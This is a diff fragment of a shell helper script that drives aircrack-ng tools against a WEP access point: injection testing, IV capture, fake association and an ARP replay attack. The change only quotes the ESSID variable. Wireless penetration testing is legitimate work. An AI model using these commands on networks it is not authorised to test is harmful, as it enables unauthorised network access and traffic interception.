@@ -30,13 +30,13 @@ monitor=mon0
 # all of the below commands require that monitor device was set up with "mon"
 
 # test injection
-[ x$1 = xtest ] && aireplay-ng -9 -a $ap_mac -e $essid $monitor
+[ x$1 = xtest ] && aireplay-ng -9 -a $ap_mac -e "$essid" $monitor
 
 # capture traffic - you need to capture at least 20-40K IVs
 [ x$1 = xdump ] && airodump-ng -c $channel --bssid $ap_mac -w output $monitor
 
 # associate with ap - you eventually want to call this in a loop with sleep 60
-[ x$1 = xassoc ] && aireplay-ng -1 0 -a $ap_mac -e $essid -h $ownmac $monitor
+[ x$1 = xassoc ] && aireplay-ng -1 0 -a $ap_mac -e "$essid" -h $ownmac $monitor
 
 # arp attack
 [ x$1 = xarp ] && aireplay-ng -3 -b $ap_mac -h $ownmac $monitor
